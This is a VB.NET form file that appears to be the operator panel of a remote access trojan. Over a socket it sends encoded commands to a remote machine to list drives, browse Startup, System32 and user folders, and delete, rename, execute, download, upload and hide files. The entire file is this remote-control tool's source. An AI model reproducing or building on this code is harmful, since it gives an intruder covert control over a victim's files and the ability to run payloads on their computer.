﻿Imports System.Threading

Public Class Form10
    Public F As Form1
    Public sock As USER
    Private Sub Form10_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        F.S.Send(sock, F.ENB("GetDrives")) ' Ask Server to Get Drives
    End Sub
    Private Sub BackToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem1.Click
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            F.S.Send(sock, F.ENB("GetDrives") & F.Y)
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If
    End Sub
    Public Sub RefreshList()
        F.S.Send(sock, F.ENB("FileManager") & F.Y & F.ENB(TextBox1.Text))
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        RefreshList()
    End Sub
    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                F.S.Send(sock, F.ENB("Delete") & F.Y & "Folder" & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text))
            Case Else
                F.S.Send(sock, F.ENB("Delete") & F.Y & "File" & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text))
        End Select
        RefreshList()
    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteToolStripMenuItem.Click
        F.S.Send(sock, F.ENB("Execute") & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text))
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1

                Case 2
                    F.S.Send(sock, F.ENB("Rename") & F.Y & "Folder" & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text) & F.Y & F.ENB(a))
                Case Else
                    F.S.Send(sock, F.ENB("Rename") & F.Y & "File" & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text) & F.Y & F.ENB(a))
            End Select
        End If
        RefreshList()
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        Try
            Dim AA As String = F.ENB(TextBox1.Text & ListView1.FocusedItem.Text)
            F.S.Send(sock, F.ENB("downloadfile") & F.Y & AA)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        If o.FileName.Length > 0 Then
            Dim n As New IO.FileInfo(o.FileName)
            F.S.Send(sock, F.ENB("sendfileto") & F.Y & F.ENB(TextBox1.Text & n.Name) & F.Y & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
        End If
    End Sub

    Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewFolderToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The folder's Name", "Creat New Folder")
        F.S.Send(sock, F.ENB("creatnewfolder") & F.Y & TextBox1.Text & n)
        RefreshList()
    End Sub

    Private Sub HideFolderFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideFolderFileToolStripMenuItem.Click
        F.S.Send(sock, F.ENB("hidefolderfile") & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text))
    End Sub

    Private Sub ShowFolderFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowFolderFileToolStripMenuItem.Click
        F.S.Send(sock, F.ENB("showfolderfile") & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text))
    End Sub

    Private Sub NewTextFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewTextFileToolStripMenuItem.Click
        Dim n As String
        n = InputBox("Enter The Text File's Name", "Creat New Text File")
        F.S.Send(sock, F.ENB("creatnewtextfile") & F.Y & TextBox1.Text & n & ".txt")
        RefreshList()
    End Sub

    Private Sub ViewEditTextToolStripMenuItem_Click(sender As Object, e As EventArgs)
        F.S.Send(sock, F.ENB("edittextfile") & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text))
    End Sub

    Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Back1ToolStripMenuItem.Click
        F.S.Send(sock, F.ENB("viewimage") & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text))
    End Sub

    Private Sub SetAsWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetAsWallpaperToolStripMenuItem.Click
        F.S.Send(sock, F.ENB("setaswallpaper") & F.Y & F.ENB(TextBox1.Text & ListView1.FocusedItem.Text))
    End Sub

    Private Sub ListView1_DoubleClick2(sender As Object, e As EventArgs) Handles ListView1.DoubleClick
        Dim ee As String = F.ENB(ListView1.FocusedItem.Text)
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += F.DEB(ee)
            Else
                TextBox1.Text += F.DEB(ee) & "\"
            End If
            RefreshList()
        End If
    End Sub

    Private Sub ListView1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ListView1.KeyPress
        Try
            If e.KeyChar = ControlChars.Back Then
                If TextBox1.Text.Length = 3 Then
                Else
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                    RefreshList()
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ListView1_MouseDoubleClick1(sender As Object, e As MouseEventArgs) Handles ListView1.MouseDoubleClick
        Dim ee As String = F.ENB(ListView1.FocusedItem.Text)
        If F.DEB(ee) = "..." Then
            BackToolStripMenuItem1.PerformClick()
        End If
        Try
            If ListView1.FocusedItem.Index = 0 Then
                If TextBox1.Text.Length < 4 Then
                Else
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                    RefreshList()
                End If
            Else
                If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
                    If TextBox1.Text.Length = 0 Then
                        TextBox1.Text += F.DEB(ee)
                    Else
                        TextBox1.Text += F.DEB(ee) & "\"
                    End If
                    RefreshList()
                Else
                    If F.DEB(ee) = "..." Then

                    Else
                        TextBox1.Text += F.DEB(ee)
                        TextBox1.Text += F.DEB(ee) & "\"
                    End If
                    RefreshList()
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Lv1_DoubleClick(sender As Object, e As EventArgs) Handles Lv1.DoubleClick
        Select Case Lv1.FocusedItem.Text
            Case "C:\"
                F.S.Send(sock, F.ENB("getdrivec"))
            Case "D:\"
                F.S.Send(sock, F.ENB("getdrived"))
            Case "Desktop"
                F.S.Send(sock, F.ENB("getdesktoppath") & F.Y)
            Case "User"
                F.S.Send(sock, F.ENB("getuserpath") & F.Y)
            Case "Temp"
                F.S.Send(sock, F.ENB("gettemppath") & F.Y)
            Case "System32"
                F.S.Send(sock, F.ENB("getsystem32") & F.Y)
            Case "Startup"
                F.S.Send(sock, F.ENB("getstartuppath") & F.Y)
            Case "Documents"
                F.S.Send(sock, F.ENB("getmydocumentspath") & F.Y)
            Case "Downloads"
                F.S.Send(sock, F.ENB("downloads") & F.Y)
        End Select
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs)

    End Sub
End Class